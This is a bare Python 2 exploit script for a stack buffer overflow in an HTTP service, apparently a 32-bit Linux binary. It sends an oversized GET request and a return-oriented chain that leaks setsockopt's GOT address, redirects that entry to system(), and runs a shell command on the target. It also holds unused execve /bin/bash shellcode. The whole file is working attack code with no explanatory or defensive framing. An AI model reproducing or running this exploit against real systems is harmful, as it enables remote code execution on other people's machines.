from socket import *
import sys, struct

SHELLCODE = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
             "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
             "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
             "\x51\x53\x89\xe1\xcd\x80")

COMMAND = 'id\0'

CLEAN_23C = 0x0804905F
CLEAN_C = 0x08049065
ADDR_READ = 0x08048900
ADDR_WRITE = 0x08048A90
ADDR_PRINTF = 0x08048910
ADDR_SETSOCKOPT = 0x080488D0
PLT_SETSOCKOPT = 0x0804B3C0
DELTA_SETSOCKOPT_SYSTEM = 0x96f50

def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])

    payload = 'GET ' + 'A' * 139 + 'MAGI' + ' HTTP/1.1'
    payload = payload.replace('MAGI', struct.pack('<L', CLEAN_23C))
    payload = payload.ljust(548, 'B')

    payload += struct.pack('<L', ADDR_WRITE)
    payload += struct.pack('<L', CLEAN_C)
    payload += struct.pack('<L', 0x1)
    payload += struct.pack('<L', PLT_SETSOCKOPT)
    payload += struct.pack('<L', 0x4)

    payload += struct.pack('<L', ADDR_READ)
    payload += struct.pack('<L', CLEAN_C)
    payload += struct.pack('<L', 0x0)
    payload += struct.pack('<L', PLT_SETSOCKOPT)
    payload += struct.pack('<L', 0x4 + len(COMMAND))

    payload += struct.pack('<L', ADDR_SETSOCKOPT)
    payload += 'CCCC'
    payload += struct.pack('<L', PLT_SETSOCKOPT + 4)

    s = create_connection((ip, port))
    s.send(payload)
    data = s.recv(4)
    addr_setsockopt = struct.unpack('<L', data)[0]
    s.send(struct.pack('<L', addr_setsockopt - DELTA_SETSOCKOPT_SYSTEM) + COMMAND)
    s.send('id\n')
    print repr(s.recv(2048))
    s.close()

if '__main__' == __name__:
    main()

